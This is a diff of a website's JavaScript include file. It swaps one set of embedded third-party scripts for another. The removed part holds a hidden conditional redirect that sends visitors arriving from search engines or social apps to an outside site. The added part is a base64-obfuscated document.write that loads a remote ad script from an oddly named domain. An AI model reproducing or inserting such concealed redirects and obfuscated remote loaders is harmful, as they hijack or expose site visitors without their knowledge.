@@ -1,20 +1,6 @@
-///// Histats /////
-document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943554&101"/>');
-
-///// Statcounter /////
-var sc_project=13049188; 
-var sc_invisible=1; 
-var sc_security="28b53553";
-
-document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
-document.write('<noscript>');
-document.write('<div class="statcounter">');
-document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
-document.write('<img class="statcounter" src="https://c.statcounter.com/13049188/0/28b53553/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
-document.write('</a>');
-document.write('</div>');
-document.write('</noscript>');
-
-///// Arsae /////
-var ars = 'http://blog.wm.edu.pl';
-if(['.aol.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+///// ad---stera /////
+<div style="display: flex; justify-content: center; align-items: center;">
+    <script>
+    document.write(atob("PHNjcmlwdD4KICBhdE9wdGlvbnMgPSB7CiAgICAna2V5JyA6ICdiN2RlNmQ0MjE3Njc2OGFmODk2ZDhjZjc3ZThmN2JiNycsCiAgICAnZm9ybWF0JyA6ICdpZnJhbWUnLAogICAgJ2hlaWdodCcgOiA5MCwKICAgICd3aWR0aCcgOiA3MjgsCiAgICAncGFyYW1zJyA6IHt9CiAgfTsKPC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL29ic2Nlbml0eWZvcmVhcm0uY29tL2I3ZGU2ZDQyMTc2NzY4YWY4OTZkOGNmNzdlOGY3YmI3L2ludm9rZS5qcyI+PC9zY3JpcHQ+"));
+    </script>
+</div>
